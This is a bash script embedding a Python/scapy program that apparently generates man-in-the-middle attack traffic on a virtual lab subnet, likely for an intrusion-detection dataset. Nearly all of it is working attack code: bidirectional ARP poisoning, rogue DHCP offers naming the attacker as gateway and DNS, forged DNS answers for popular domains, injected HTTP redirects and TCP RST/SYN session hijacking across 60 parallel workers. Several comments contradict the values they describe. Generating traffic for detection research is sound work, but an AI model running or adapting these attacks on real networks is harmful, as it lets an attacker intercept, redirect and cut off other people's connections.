#!/usr/bin/env bash
#
# mitm_vm3_pure_attacks.sh – PURE MITM Attack Generator (No DoS/DDoS)
# • Duration: 120s (2 min) - Generates ~2000-5000 legitimate MITM flows
# • EXCLUSIVELY MITM Techniques:
#     - arp_poisoning      (Bidirectional ARP spoofing)
#     - dhcp_spoofing      (Fake DHCP, no starvation)
#     - dns_spoofing       (Fake DNS responses to legitimate queries)
#     - ssl_stripping      (HTTPS to HTTP Downgrade)
#     - session_hijacking  (TCP session takeover)
# • Features: Apparently legitimate traffic, stealth, realistic timing
# • Workers: 60 (balance between volume and realism)
#
set -euo pipefail

### 1) Root check
[[ $EUID -eq 0 ]] || { echo "Run with sudo for spoofing" >&2; exit 1; }

### 2) Dependencies for pure MITM
missing=()
for cmd in python3 tcpdump; do
  command -v "$cmd" &>/dev/null || missing+=("$cmd")
done
# Verify scapy
python3 -c "import scapy.all" 2>/dev/null || missing+=("python3-scapy")
if (( ${#missing[@]} )); then
  echo "ERROR: missing dependencies: ${missing[*]}" >&2
  echo "Install: sudo apt update && sudo apt install -y python3-scapy tcpdump" >&2
  exit 1
fi

### 3) Optimized parameters for realistic MITM
DURATION=300
END=$(( SECONDS + DURATION ))
IFACE="enp0s3"
GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
VICTIMS=(192.168.56.{101..102})  # Few victims for focused attacks
ATTACKER_IPS=(192.168.56.{240..250})  # Attacker IPs
WORKERS=60
MITM_RATE=8  # 5 MITM attacks per second per worker (realistic)

echo "=== VM3: PURE MITM Attacks with $WORKERS workers for ${DURATION}s ==="
echo "=== Techniques: ARP Poisoning, DHCP Spoofing, DNS Spoofing, SSL Stripping, Session Hijacking ==="

### 4) Network setup
echo "Configuring network for MITM..."
sysctl -w net.ipv4.ip_forward=1 &>/dev/null || :
for ip in "${ATTACKER_IPS[@]}"; do
  ip addr add "${ip}/24" dev "$IFACE" 2>/dev/null || :
done

### 5) Cleanup
cleanup(){
  echo "Cleaning up MITM attacks..."
  pkill -f "mitm_pure_worker" &>/dev/null || :
  sleep 2
  for ip in "${ATTACKER_IPS[@]}"; do
    ip addr del "${ip}/24" dev "$IFACE" 2>/dev/null || :
  done
  echo "Cleanup completed."
}
trap cleanup EXIT INT TERM

### 6) Pure MITM Worker
pure_mitm_worker(){
  local worker_id=$1
  local end_time=$2
  
  # Python script for pure MITM attacks
  local mitm_script="/tmp/pure_mitm_${worker_id}.py"
  
  cat > "$mitm_script" << 'EOF'
#!/usr/bin/env python3
import sys
import time
import random
import threading
from scapy.all import *
import socket
import warnings

# Suppress scapy warnings for clean output
warnings.filterwarnings("ignore", category=SyntaxWarning)
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.getLogger("scapy").setLevel(logging.ERROR)

class PureMITMAttacker:
    def __init__(self, worker_id, iface, victims, attacker_ips, gateway):
        self.worker_id = worker_id
        self.iface = iface
        self.victims = victims
        self.attacker_ips = attacker_ips
        self.gateway = gateway
        self.attack_count = 0
        self.running = True
        
    def arp_poisoning_attack(self, victim, attacker_ip, duration=5):
        """Bidirectional ARP Poisoning - Classic MITM"""
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id}: ARP Poisoning {victim} via {attacker_ip}")
        
        # Default MACs to avoid discovery (more stealth)
        gateway_mac = "00:0c:29:ab:cd:ef"  # Typical VMware MAC
        victim_mac = "00:0c:29:12:34:56"   # Typical victim MAC
        attacker_mac = "00:0c:29:aa:bb:cc" # Attacker MAC
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time and self.running:
            # Poison victim - use sendp for full L2 control
            arp_victim = Ether(src=attacker_mac, dst=victim_mac)/ARP(
                op=2, pdst=victim, hwdst=victim_mac, 
                psrc=self.gateway, hwsrc=attacker_mac
            )
            sendp(arp_victim, iface=self.iface, verbose=0)
            
            # Poison gateway
            arp_gateway = Ether(src=attacker_mac, dst=gateway_mac)/ARP(
                op=2, pdst=self.gateway, hwdst=gateway_mac, 
                psrc=victim, hwsrc=attacker_mac
            )
            sendp(arp_gateway, iface=self.iface, verbose=0)
            
            packets_sent += 2
            time.sleep(0.5)  # Realistic timing for ARP poisoning
        
        return packets_sent
    
    def dhcp_spoofing_attack(self, attacker_ip, duration=3):
        """DHCP Spoofing - Respond as fake DHCP server"""
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id}: DHCP Spoofing from {attacker_ip}")
        
        def dhcp_responder():
            # Create fake DHCP server responding to DISCOVER
            fake_dhcp_offer = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                IP(src=attacker_ip, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr="192.168.56.200", siaddr=attacker_ip, chaddr=RandString(6)) /
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", attacker_ip),
                    ("lease_time", 3600),
                    ("subnet_mask", "255.255.255.0"),
                    ("router", attacker_ip),  # Set ourselves as gateway
                    ("name_server", attacker_ip),  # Set ourselves as DNS
                    "end"
                ])
            )
            return fake_dhcp_offer
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time and self.running:
            # Send fake DHCP offers periodically
            fake_offer = dhcp_responder()
            sendp(fake_offer, iface=self.iface, verbose=0)
            packets_sent += 1
            time.sleep(1)  # DHCP offers every second
        
        return packets_sent
    
    def dns_spoofing_attack(self, victim, attacker_ip, duration=4):
        """DNS Spoofing - Fake DNS responses to legitimate queries"""
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id}: DNS Spoofing {victim} -> {attacker_ip}")
        
        # Common domains to spoof
        domains = [
            "google.com", "facebook.com", "youtube.com", "amazon.com",
            "microsoft.com", "apple.com", "netflix.com", "instagram.com"
        ]
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time and self.running:
            domain = random.choice(domains)
            query_id = random.randint(1, 65535)
            
            # Use sendp for full L2 control and avoid warnings
            fake_dns_response = (
                Ether(src="00:0c:29:aa:bb:cc", dst="00:0c:29:12:34:56") /
                IP(src="8.8.8.8", dst=victim) /
                UDP(sport=53, dport=random.randint(32768, 65535)) /
                DNS(
                    id=query_id,
                    qr=1, aa=1, rd=1, ra=1,
                    qd=DNSQR(qname=domain, qtype="A"),
                    an=DNSRR(rrname=domain, type="A", rdata=attacker_ip, ttl=300)
                )
            )
            
            sendp(fake_dns_response, iface=self.iface, verbose=0)
            packets_sent += 1
            time.sleep(0.3)  # DNS responses every 300ms
        
        return packets_sent
    
    def ssl_stripping_simulation(self, victim, attacker_ip, duration=6):
        """SSL Stripping - Simulate HTTPS to HTTP downgrade"""
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id}: SSL Stripping {victim} via {attacker_ip}")
        
        # Simulate HTTP traffic interception and modification
        common_ports = [80, 8080, 3128, 8000]
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time and self.running:
            # Simulate HTTPS to HTTP redirection
            target_port = random.choice(common_ports)
            
            # TCP packet simulating redirection - use sendp for L2
            redirect_packet = (
                Ether(src="00:0c:29:aa:bb:cc", dst="00:0c:29:12:34:56") /
                IP(src=attacker_ip, dst=victim) /
                TCP(sport=target_port, dport=random.randint(1024, 65535), flags="PA") /
                Raw(load=f"HTTP/1.1 302 Found\r\nLocation: http://malicious-site.com\r\n\r\n")
            )
            
            sendp(redirect_packet, iface=self.iface, verbose=0)
            packets_sent += 1
            time.sleep(0.8)  # SSL stripping every 800ms
        
        return packets_sent
    
    def session_hijacking_attack(self, victim, attacker_ip, duration=5):
        """Session Hijacking - Take control of TCP sessions"""
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id}: Session Hijacking {victim} from {attacker_ip}")
        
        # Common ports for hijacking
        target_ports = [80, 443, 22, 23, 25, 110, 143]
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time and self.running:
            target_port = random.choice(target_ports)
            
            # RST injection to close legitimate connection - use sendp
            rst_packet = (
                Ether(src="00:0c:29:aa:bb:cc", dst="00:0c:29:12:34:56") /
                IP(src=victim, dst=self.gateway) /
                TCP(sport=random.randint(1024, 65535), dport=target_port, 
                    flags="R", seq=random.randint(1, 4294967295))
            )
            
            # New SYN from our IP to take control
            hijack_syn = (
                Ether(src="00:0c:29:aa:bb:cc", dst="00:0c:29:ab:cd:ef") /
                IP(src=attacker_ip, dst=self.gateway) /
                TCP(sport=random.randint(1024, 65535), dport=target_port, 
                    flags="S", seq=random.randint(1, 4294967295))
            )
            
            sendp(rst_packet, iface=self.iface, verbose=0)
            sendp(hijack_syn, iface=self.iface, verbose=0)
            packets_sent += 2
            time.sleep(1.2)  # Session hijacking every 1.2s
        
        return packets_sent
    
    def run_mitm_attacks(self, duration):
        """Execute varied MITM attacks"""
        techniques = [
            self.arp_poisoning_attack,
            self.dhcp_spoofing_attack, 
            self.dns_spoofing_attack,
            self.ssl_stripping_simulation,
            self.session_hijacking_attack
        ]
        
        start_time = time.time()
        end_time = start_time + duration
        total_packets = 0
        
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id} started - Pure MITM for {duration}s")
        
        while time.time() < end_time and self.running:
            technique = random.choice(techniques)
            victim = random.choice(self.victims)
            attacker_ip = random.choice(self.attacker_ips)
            
            # Variable but realistic duration for each attack
            attack_duration = random.uniform(2, 8)
            
            try:
                if technique == self.dhcp_spoofing_attack:
                    packets = technique(attacker_ip, attack_duration)
                elif technique in [self.dns_spoofing_attack, self.ssl_stripping_simulation, 
                                 self.session_hijacking_attack, self.arp_poisoning_attack]:
                    packets = technique(victim, attacker_ip, attack_duration)
                
                total_packets += packets
                self.attack_count += 1
                
                if self.attack_count % 10 == 0:
                    elapsed = time.time() - start_time
                    rate = total_packets / elapsed if elapsed > 0 else 0
                    print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id}: {self.attack_count} MITM attacks, {total_packets} packets ({rate:.1f} pps)")
                
            except Exception as e:
                print(f"Worker {self.worker_id} error: {e}")
            
            # Pause between attacks (realistic behavior)
            time.sleep(random.uniform(0.5, 2.0))
        
        self.running = False
        print(f"[{time.strftime('%H:%M:%S')}] Worker {self.worker_id} completed: {self.attack_count} MITM attacks, {total_packets} packets")

# Main execution
if __name__ == "__main__":
    worker_id = int(sys.argv[1])
    duration = float(sys.argv[2])
    iface = sys.argv[3]
    
    victims = [f"192.168.56.{i}" for i in range(101, 106)]
    attacker_ips = [f"192.168.56.{i}" for i in range(240, 251)]
    gateway = "192.168.56.1"
    
    attacker = PureMITMAttacker(worker_id, iface, victims, attacker_ips, gateway)
    attacker.run_mitm_attacks(duration)
EOF

  chmod +x "$mitm_script"
  python3 "$mitm_script" "$worker_id" "$((end_time - SECONDS))" "$IFACE" &
  
  # Clean temporary script
  (sleep $((end_time - SECONDS + 5)); rm -f "$mitm_script") &
}

### 7) Specific MITM monitoring
monitor_mitm(){
  echo "=== Monitoring pure MITM attacks ==="
  while (( SECONDS < END )); do
    local active_workers=$(pgrep -f "pure_mitm" | wc -l)
    local arp_traffic=$(tcpdump -i "$IFACE" -c 100 arp 2>/dev/null | wc -l)
    echo "[$(date +%T)] Active MITM workers: $active_workers, Detected ARP traffic: $arp_traffic"
    sleep 15
  done
}

### 8) Launch MITM workers
echo "Starting $WORKERS workers for pure MITM attacks..."
for i in $(seq 1 $WORKERS); do
  pure_mitm_worker "$i" "$END" &
  
  if (( i % 15 == 0 )); then
    echo "Launched $i MITM workers..."
    sleep 0.5
  fi
done

# Monitoring
monitor_mitm &
monitor_pid=$!

echo "Waiting for MITM attacks completion..."
wait

kill $monitor_pid &>/dev/null || :

### 9) Final summary
echo ""
echo "=== PURE MITM ATTACKS SUMMARY ==="
echo "Duration: ${DURATION}s"
echo "MITM Workers: $WORKERS"
echo "Techniques used: ARP Poisoning, DHCP Spoofing, DNS Spoofing, SSL Stripping, Session Hijacking"
echo "Target rate: ~$((WORKERS * MITM_RATE)) MITM attacks/second"
echo "Expected volume: ~$((WORKERS * MITM_RATE * DURATION / 60)) MITM attacks/minute"
echo ""
echo "IMPORTANT: This traffic is 100% MITM - Contains no DoS, DDoS or flooding"
echo "=== MITM ATTACKS COMPLETED ==="
